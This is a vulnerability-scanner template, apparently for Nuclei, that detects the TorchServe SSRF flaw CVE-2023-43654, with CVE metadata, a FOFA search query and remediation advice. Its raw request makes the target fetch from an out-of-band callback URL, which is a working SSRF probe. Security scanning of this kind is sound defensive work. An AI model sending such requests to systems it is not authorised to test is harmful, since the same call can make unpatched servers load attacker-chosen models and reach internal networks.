http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  - part: interactsh_request
    type: word
    words:
    - 'User-Agent: Java'
  - part: content_type
    type: word
    words:
    - application/json
  matchers-condition: and
  raw:
  - 'POST /models?url=http%3a//{{interactsh-url}} HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    '
id: CVE-2023-43654
info:
  author: DhiyaneshDk
  classification:
    cpe: cpe:2.3:a:pytorch:torchserve:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-43654
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-918
    epss-percentile: 0.99671
    epss-score: 0.91846
  description: 'TorchServe is a tool for serving and scaling PyTorch models in production.
    TorchServe default configuration lacks proper input validation, enabling third
    parties to invoke remote HTTP download requests and write files to the disk. This
    issue could be taken advantage of to compromise the integrity of the system and
    sensitive data. This issue is present in versions 0.1.0 to 0.8.1. A user is able
    to load the model of their choice from any URL that they would like to use. The
    user of TorchServe is responsible for configuring both the allowed_urls and specifying
    the model URL to be used. A pull request to warn the user when the default value
    for allowed_urls is used has been merged in PR #2534. TorchServe release 0.8.2
    includes this change. Users are advised to upgrade. There are no known workarounds
    for this issue.

    '
  impact: 'Unauthenticated attackers can load malicious models from arbitrary URLs
    and write files to disk due to lack of input validation, potentially compromising
    the PyTorch TorchServe system and accessing internal network resources through
    SSRF.

    '
  metadata:
    fofa-query: body="Requested method is not allowed, please refer to API document"
    max-request: 1
    product: torchserve
    vendor: pytorch
    verified: true
  name: PyTorch TorchServe SSRF
  reference:
  - https://github.com/pytorch/serve/pull/2534
  - https://github.com/pytorch/serve/releases/tag/v0.8.2
  - https://github.com/OligoCyberSecurity/ShellTorchChecker
  remediation: 'Update PyTorch TorchServe to version 0.8.2 or later that includes
    allowed_urls validation and restricts model loading to trusted sources.

    '
  severity: critical
  tags: cve,cve2023,pytorch,oast,ssrf,vuln,vkev
